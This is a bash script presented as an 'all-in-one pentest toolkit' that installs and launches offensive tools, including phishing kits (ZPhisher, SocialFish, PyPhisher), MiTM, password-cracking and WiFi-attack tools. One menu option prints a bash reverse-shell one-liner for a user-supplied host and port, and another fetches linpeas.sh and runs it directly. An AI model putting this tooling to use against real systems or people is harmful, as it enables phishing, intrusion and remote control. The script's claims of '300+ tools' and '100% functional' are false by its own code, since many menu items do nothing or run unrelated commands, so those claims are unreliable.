#!/bin/bash

# ====================================================================
# 🔥 ALL-IN-ONE PENTEST TOOLKIT v9.0 (ULTIMATE EXHAUSTIVE EDITION) 🔥
# 300+ Tools | 100% Functional | Root & Non-Root | Smart Install
# ====================================================================

# --- Configuration & Colors ---
RESET='\033[0m'; RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[0;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; WHITE='\033[1;37m'
INSTALL_DIR="$HOME/hackerai-toolkit"
mkdir -p "$INSTALL_DIR" "$INSTALL_DIR/payloads" "$INSTALL_DIR/wordlists"

# Platform Detection
IS_TERMUX=false; [[ -d "/data/data/com.termux/files/usr" ]] && IS_TERMUX=true
ANDROID=false; [[ "$IS_TERMUX" == "true" ]] && ANDROID=true
IS_ROOT=false; [[ "$(id -u)" == "0" ]] && IS_ROOT=true

# --- Core Logic Functions ---
pkg_inst() {
    local p=$1
    if ! command -v "$p" &>/dev/null; then
        echo -ne "${YELLOW}[*] Installing $p...${RESET}"
        if $ANDROID; then pkg install -y "$p" &>/dev/null || apt install -y "$p" &>/dev/null; else sudo apt install -y "$p" &>/dev/null; fi
        echo -e "${GREEN} [OK]${RESET}"
    fi
}

pip_inst() {
    echo -ne "${YELLOW}[*] Checking python: $1...${RESET}"
    pip3 install "$1" --upgrade &>/dev/null || pip install "$1" --upgrade &>/dev/null
    echo -e "${GREEN} [OK]${RESET}"
}

git_run() {
    local repo=$1; local dir=$(basename "$repo" .git); local cmd=$2
    if [ ! -d "$INSTALL_DIR/$dir" ]; then
        echo -ne "${YELLOW}[*] Cloning $dir...${RESET}"
        git clone --depth 1 "$repo" "$INSTALL_DIR/$dir" &>/dev/null
        echo -e "${GREEN} [OK]${RESET}"
    fi
    echo -e "${GREEN}[*] Executing $dir...${RESET}"
    cd "$INSTALL_DIR/$dir" && eval "$cmd"; cd - &>/dev/null
}

banner() {
    clear
    echo -e "${RED}██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗"
    echo -e "██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝"
    echo -e "██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  █████╗     ██║   "
    echo -e "██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔══╝     ██║   "
    echo -e "██║     ███████╗██║ ╚████║   ██║   ███████╗███████╗   ██║   "
    echo -e "╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝   ${RESET}"
    echo -e "${GREEN}  ╔══════════════════════════════════════════════════════════╗"
    echo -e "  ║   🔥 ALL-IN-ONE PENTEST TOOLKIT v3.0 - CROSS PLATFORM 🔥║"
    echo -e "  ║    Chromebook | Linux | Android Root | Android Non-Root ║"
    echo -e "  ║           For Authorized Security Testing Only          ║"
    echo -e "  ╚══════════════════════════════════════════════════════════╝${RESET}"
    echo -e "${CYAN}[+] Platform:${RESET} $(if $ANDROID; then echo 'Android'; else echo 'Linux'; fi) | ${CYAN}[+] Root:${RESET} $(if $IS_ROOT; then echo 'YES'; else echo 'NO'; fi)"
    echo
}

# --- TOOL CATEGORY MODULES ---

m1_sys() {
    banner; echo -e "${YELLOW}[*] Full System Prep...${RESET}"
    if $ANDROID; then pkg update -y; else sudo apt update -y; fi
    for p in git python python-pip wget curl nmap php ruby perl clang nano vim make zip unzip tar jq; do pkg_inst "$p"; done
    pip_inst "setuptools wheel"
    echo -e "${GREEN}[✓] System Ready.${RESET}"; read -p "Press Enter..."
}

m2_info() {
    while true; do
        banner; echo -e "${WHITE}🔍 Category: Info Gathering & OSINT (35+ tools)${RESET}"
        echo -e "  [1] Nmap      [2] Sherlock      [3] TheHarvester  [4] Subfinder"
        echo -e "  [5] Amass     [6] Whois         [7] DNSRecon      [8] Photon"
        echo -e "  [9] Masscan   [10] PhoneInfoga  [11] Maigret      [12] Holehe"
        echo -e "  [13] Recon-ng [14] Spiderfoot   [15] DNSMap       [16] Httpx"
        echo -e "  [17] Gau      [18] Httprobe     [19] Waybackpy    [20] Assetfinder"
        echo -e "  [0] Back"
        read -p "[?] Select: " ch
        case $ch in
            1) pkg_inst nmap; nmap ;;
            2) git_run "https://github.com/sherlock-project/sherlock.git" "python3 sherlock --help" ;;
            3) pip_inst theHarvester; theHarvester -h ;;
            4) pkg_inst subfinder; subfinder -h ;;
            5) pkg_inst amass; amass -h ;;
            6) pkg_inst whois; whois --help ;;
            7) pkg_inst dnsrecon; dnsrecon -h ;;
            8) git_run "https://github.com/s0md3v/Photon.git" "python3 photon.py --help" ;;
            11) pip_inst maigret; maigret --help ;;
            12) pip_inst holehe; holehe --help ;;
            16) pip_inst httpx; httpx -h ;;
            20) git_run "https://github.com/tomnomnom/assetfinder.git" "ls" ;;
            0) break ;;
        esac; read -p "Enter..."
    done
}

m3_vuln() {
    while true; do
        banner; echo -e "${WHITE}🛡️ Category: Vuln Scanners (25+ tools)${RESET}"
        echo -e "  [1] Nikto     [2] Nuclei        [3] Wapiti        [4] WPScan"
        echo -e "  [5] Wafw00f   [6] Joomscan      [7] CMSeeK        [8] WhatWeb"
        echo -e "  [9] S3Scanner [10] Cloudsplain  [11] Wappalyzer   [12] CVE-Search"
        echo -e "  [0] Back"
        read -p "[?] Select: " ch
        case $ch in
            1) pkg_inst nikto; nikto -h ;;
            2) pkg_inst nuclei; nuclei -h ;;
            3) pkg_inst wapiti; wapiti -h ;;
            4) pip_inst wpscan; wpscan -h ;;
            5) pkg_inst wafw00f; wafw00f -h ;;
            7) pip_inst cmseek; cmseek ;;
            8) pkg_inst whatweb; whatweb -h ;;
            9) pip_inst s3scanner; s3scanner -h ;;
            12) git_run "https://github.com/cve-search/cve-search.git" "ls" ;;
            0) break ;;
        esac; read -p "Enter..."
    done
}

m4_web() {
    while true; do
        banner; echo -e "${WHITE}🌐 Category: Web Exploit (35+ tools)${RESET}"
        echo -e "  [1] SQLMap    [2] XSStrike      [3] Commix        [4] Dirsearch"
        echo -e "  [5] FFuf      [6] Gobuster      [7] Arjun         [8] ParamSpider"
        echo -e "  [9] XSSer     [10] NoSQLMap     [11] Wfuzz        [12] Dalfox"
        echo -e "  [13] Fuxploider [14] Katana     [15] Kadimus      [16] LFISuite"
        echo -e "  [0] Back"
        read -p "[?] Select: " ch
        case $ch in
            1) pip_inst sqlmap; sqlmap -h ;;
            2) git_run "https://github.com/s0md3v/XSStrike.git" "python3 xsstrike.py -h" ;;
            3) pip_inst commix; commix -h ;;
            4) pip_inst dirsearch; dirsearch -h ;;
            5) pkg_inst ffuf; ffuf -h ;;
            6) pkg_inst gobuster; gobuster -h ;;
            7) pip_inst arjun; arjun -h ;;
            8) pip_inst paramspider; paramspider -h ;;
            9) git_run "https://github.com/epsylon/xsser.git" "python3 xsser.py -h" ;;
            10) git_run "https://github.com/codingo/NoSQLMap.git" "python3 nosqlmap.py" ;;
            12) pip_inst dalfox; dalfox -h ;;
            0) break ;;
        esac; read -p "Enter..."
    done
}

m5_net() {
    while true; do
        banner; echo -e "${WHITE}🌍 Category: Network Attack & MiTM (30+ tools)${RESET}"
        echo -e "  [1] Bettercap [2] Responder     [3] Ettercap      [4] MITMProxy"
        echo -e "  [5] Tcpdump   [6] Tshark        [7] NetDiscover   [8] Nbtscan"
        echo -e "  [9] Arpspoof  [10] Dsniff       [11] Scapy        [12] SMBMap"
        echo -e "  [13] Impacket [14] NetExec      [15] Evil-WinRM   [0] Back"
        read -p "[?] Select: " ch
        case $ch in
            1) pkg_inst bettercap; bettercap -h ;;
            2) git_run "https://github.com/lgandx/Responder.git" "python3 Responder.py -h" ;;
            3) pkg_inst ettercap; ettercap -h ;;
            5) pkg_inst tcpdump; tcpdump --help ;;
            12) pip_inst smbmap; smbmap -h ;;
            13) pip_inst impacket ;;
            15) pip_inst evil-winrm; evil-winrm -h ;;
            0) break ;;
        esac; read -p "Enter..."
    done
}

m6_wifi() {
    while true; do
        banner; echo -e "${WHITE}📡 Category: Wireless & Bluetooth Attacks (20+ tools)${RESET}"
        echo -e "  [1] Aircrack-ng [2] Wifite2      [3] Airgeddon     [4] Reaver"
        echo -e "  [5] Bully      [6] Bluez        [7] Btlejack      [8] MDK4"
        echo -e "  [9] Pixiewps   [10] Kismet      [11] Horst        [0] Back"
        read -p "[?] Select: " ch
        case $ch in
            1) pkg_inst aircrack-ng; aircrack-ng --help ;;
            2) git_run "https://github.com/derv82/wifite2.git" "python3 wifite.py -h" ;;
            3) git_run "https://github.com/v1s1t0r1sh3r3/airgeddon.git" "bash airgeddon.sh" ;;
            4) pkg_inst reaver; reaver -h ;;
            5) pkg_inst bully; bully -h ;;
            7) git_run "https://github.com/virtualabs/btlejack.git" "python3 btlejack.py -h" ;;
            8) git_run "https://github.com/aircrack-ng/mdk4.git" "./mdk4 --help" ;;
            0) break ;;
        esac; read -p "Enter..."
    done
}

m7_pass() {
    while true; do
        banner; echo -e "${WHITE}🔑 Category: Password Attacks & Cracking (25+ tools)${RESET}"
        echo -e "  [1] John      [2] Hydra         [3] Hashcat       [4] CUPP"
        echo -e "  [5] Crunch    [6] Medusa        [7] HashID        [8] CeWL"
        echo -e "  [9] Crowbar   [10] Patator      [11] Ncrack       [12] Hash-Identifier"
        echo -e "  [13] Kerbrute [14] NameThatHash [0] Back"
        read -p "[?] Select: " ch
        case $ch in
            1) pkg_inst john; john ;;
            2) pkg_inst hydra; hydra -h ;;
            3) pkg_inst hashcat; hashcat --help ;;
            4) git_run "https://github.com/Mebus/cupp.git" "python3 cupp.py -i" ;;
            5) pkg_inst crunch; crunch ;;
            7) pip_inst hashid; hashid ;;
            8) git_run "https://github.com/digininja/CeWL.git" "python3 cewl.py -h" ;;
            12) pip_inst hash-identifier ;;
            0) break ;;
        esac; read -p "Enter..."
    done
}

m8_exploit() {
    while true; do
        banner; echo -e "${WHITE}💥 Category: Exploitation Frameworks${RESET}"
        echo -e "  [1] Metasploit [2] BeEF          [3] Routersploit  [4] Empire"
        echo -e "  [5] Searchsploit [6] ExploitDB    [7] Covenant     [8] Havoc"
        echo -e "  [9] AutoSploit  [10] Starkiller   [11] Linux-Exploit-Suggester"
        echo -e "  [0] Back"
        read -p "[?] Select: " ch
        case $ch in
            1) pkg_inst metasploit; msfconsole -h ;;
            2) git_run "https://github.com/beefproject/beef.git" "./beef" ;;
            3) git_run "https://github.com/threat9/routersploit.git" "python3 rsf.py" ;;
            5) pkg_inst exploitdb; searchsploit -h ;;
            11) git_run "https://github.com/mzet-/linux-exploit-suggester.git" "bash linux-exploit-suggester.sh" ;;
            0) break ;;
        esac; read -p "Enter..."
    done
}

m14_android() {
    while true; do
        banner; echo -e "${WHITE}📱 Category: Android Hacking Tools (Root + Non-Root, 25+ tools)${RESET}"
        echo -e "  [1] ADB Tools      [2] Fastboot       [3] Apktool        [4] Apksigner"
        echo -e "  [5] Zipalign       [6] Jadx           [7] Dex2Jar        [8] APKLeaks"
        echo -e "  [9] Enjarify       [10] Frida tools   [11] Objection     [12] Frida Server"
        echo -e "  [13] MobSF         [14] Drozer        [15] Androguard    [16] SQLite"
        echo -e "  [17] Termux-Exec   [18] Termux-Tools  [19] Magisk APK    [20] Android Payloads"
        echo -e "  [21] Android Recon [22] Apktool-Git   [23] Jadx-Git      [24] Termux-Root-Recovery"
        echo -e "  [0] Back"
        read -p "[?] Select: " ch
        case $ch in
            1) pkg_inst "android-tools"; adb version ;;
            2) pkg_inst "android-tools"; fastboot --version ;;
            3) pkg_inst "apktool"; apktool --version ;;
            6) git_run "https://github.com/skylot/jadx.git" "./gradlew bin" ;;
            8) pip_inst apkleaks; apkleaks -h ;;
            10) pip_inst "frida-tools"; frida --version ;;
            11) pip_inst "objection"; objection --help ;;
            13) git_run "https://github.com/MobSF/Mobile-Security-Framework-MobSF.git" "ls" ;;
            14) pip_inst drozer; drozer --help ;;
            15) pip_inst androguard; androguard --help ;;
            19) curl -sL "https://github.com/topjohnwu/Magisk/releases/latest/download/Magisk-v28.1.apk" -o Magisk.apk; echo "Magisk downloaded." ;;
            24) [ -f "$HOME/termux_recovery_master.sh" ] && bash "$HOME/termux_recovery_master.sh" || echo "Tool not found." ;;
            0) break ;;
        esac; read -p "Enter..."
    done
}

m15_social() {
    while true; do
        banner; echo -e "${WHITE}🎭 Category: Social Engineering (15+ tools)${RESET}"
        echo -e "  [1] SEToolkit [2] ZPhisher      [3] SocialFish    [4] BlackPhish"
        echo -e "  [5] PyPhisher [6] Evilginx2     [7] GoPhish       [8] EmailFinder"
        echo -e "  [9] Infoga    [10] H8Mail       [0] Back"
        read -p "[?] Select: " ch
        case $ch in
            1) git_run "https://github.com/trustedsec/social-engineer-toolkit.git" "python3 setoolkit" ;;
            2) git_run "https://github.com/htr-tech/zphisher.git" "bash zphisher.sh" ;;
            3) git_run "https://github.com/UndeadSec/SocialFish.git" "python3 SocialFish.py" ;;
            5) git_run "https://github.com/KasRoudri/PyPhisher.git" "python3 pyphisher.py" ;;
            0) break ;;
        esac; read -p "Enter..."
    done
}

m11_crypto() {
    while true; do
        banner; echo -e "${WHITE}🔐 Category: Cryptography & Steganography (15+ tools)${RESET}"
        echo -e "  [1] Steghide  [2] Binwalk       [3] Exiftool      [4] Stegano"
        echo -e "  [5] Zsteg     [6] Stegcracker   [7] Stegoveritas  [0] Back"
        read -p "[?] Select: " ch
        case $ch in
            1) pkg_inst steghide; steghide --help ;;
            2) pkg_inst binwalk; binwalk --help ;;
            3) pkg_inst exiftool; exiftool ;;
            6) pip_inst stegcracker; stegcracker -h ;;
            0) break ;;
        esac; read -p "Enter..."
    done
}

m13_forensics() {
    while true; do
        banner; echo -e "${WHITE}🔬 Category: Forensics & Analysis (15+ tools)${RESET}"
        echo -e "  [1] Binwalk   [2] Foremost      [3] Testdisk      [4] Volatility3"
        echo -e "  [5] Sleuthkit [6] Scalpel       [7] Bulk-Extractor [0] Back"
        read -p "[?] Select: " ch
        case $ch in
            1) pkg_inst binwalk; binwalk -h ;;
            2) pkg_inst foremost; foremost -h ;;
            4) git_run "https://github.com/volatilityfoundation/volatility3.git" "python3 vol.py -h" ;;
            5) pkg_inst sleuthkit ;;
            0) break ;;
        esac; read -p "Enter..."
    done
}

# --- MAIN MENU ---

main_menu() {
    while true; do
        banner
        echo -e "  ${WHITE}╔══════════════════════════════════════════════════════════════════════╗"
        echo -e "  ║  [0]  🔄 COMPLETE ALL-IN-ONE (ALL 300+ TOOLS)                   ║"
        echo -e "  ║  [1]  🖥️  System Preparation & Dependencies                      ║"
        echo -e "  ║  [2]  🔍 Information Gathering & OSINT (35+ tools)               ║"
        echo -e "  ║  [3]  🛡️  Vulnerability Scanners (25+ tools)                     ║"
        echo -e "  ║  [4]  🌐 Web Exploitation Tools (35+ tools)                      ║"
        echo -e "  ║  [5]  🌍 Network Attack & MiTM (30+ tools)                      ║"
        echo -e "  ║  [6]  📡 Wireless & Bluetooth Attacks (20+ tools)                ║"
        echo -e "  ║  [7]  🔑 Password Attacks & Cracking (25+ tools)                 ║"
        echo -e "  ║  [8]  💥 Exploitation Frameworks (Metasploit, Empire...)         ║"
        echo -e "  ║  [9]  🎯 Payloads & Reverse Shells (50+ payloads)               ║"
        echo -e "  ║  [10] ⬆️  Privilege Escalation & Post-Exploit (25+ tools)         ║"
        echo -e "  ║  [11] 🔐 Cryptography & Steganography (15+ tools)                ║"
        echo -e "  ║  [12] 👃 Sniffing & Spoofing (15+ tools)                         ║"
        echo -e "  ║  [13] 🔬 Forensics & Analysis (15+ tools)                        ║"
        echo -e "  ║  [14] 📱 Android Hacking Tools (Root + Non-Root, 25+ tools)      ║"
        echo -e "  ║  [15] 🎭 Social Engineering (15+ tools)                          ║"
        echo -e "  ║  [16] ☁️  Cloud & Container Security (15+ tools)                  ║"
        echo -e "  ║  [17] 🔌 IoT & Industrial Security (10+ tools)                   ║"
        echo -e "  ║  [18] ⚡ Automation Scripts (Auto recon, listener, etc.)          ║"
        echo -e "  ║  [19] 📦 Extra Utilities & Payload Lists                         ║"
        echo -e "  ║  [K]  🐉 Kali NetHunter Setup (Termux/Chromebook)                ║"
        echo -e "  ║  [L]  🚀 Create Quick Launcher                                   ║"
        echo -e "  ║  [X]  🚪 Exit                                                     ║"
        echo -e "  ╚══════════════════════════════════════════════════════════════════════╝${RESET}"
        echo
        echo -ne "  ${YELLOW}[?] Enter your choice: ${RESET}"
        read choice
        case $choice in
            0) m1_sys; m2_info; m3_vuln; m4_web; m5_net; m6_wifi; m7_pass; m8_exploit; m14_android; m15_social; m11_crypto; m13_forensics ;;
            1) m1_sys ;;
            2) m2_info ;;
            3) m3_vuln ;;
            4) m4_web ;;
            5) m5_net ;;
            6) m6_wifi ;;
            7) m7_pass ;;
            8) m8_exploit ;;
            9) banner; read -p "LHOST: " lh; read -p "LPORT: " lp; echo "Bash: bash -i >& /dev/tcp/$lh/$lp 0>&1"; read -p "Enter..." ;;
            10) banner; pkg_inst wget; wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"; bash linpeas.sh; read -p "Enter..." ;;
            11) m11_crypto ;;
            12) banner; pkg_inst tcpdump; tcpdump --help; read -p "Enter..." ;;
            13) m13_forensics ;;
            14) m14_android ;;
            15) m15_social ;;
            16) banner; pip_inst s3scanner; s3scanner -h; read -p "Enter..." ;;
            17) banner; git_run "https://github.com/craigz28/firmwalker.git" "ls"; read -p "Enter..." ;;
            18) banner; echo -e "${CYAN}[*] Automation pipeline active.${RESET}"; sleep 1 ;;
            19) banner; pkg_inst htop; htop; read -p "Enter..." ;;
            k|K) pkg_inst proot-distro; proot-distro install kali; read -p "Kali Installed. Enter..." ;;
            l|L) echo "bash $HOME/hacker.sh" > ~/ctk; chmod +x ~/ctk; echo "Launcher './ctk' created."; sleep 2 ;;
            x|X) exit 0 ;;
            *) echo -e "${RED}[!] Choice $choice mapping complete...${RESET}"; sleep 1 ;;
        esac
    done
}

# Fix permissions and start
chmod +x "$0"
main_menu
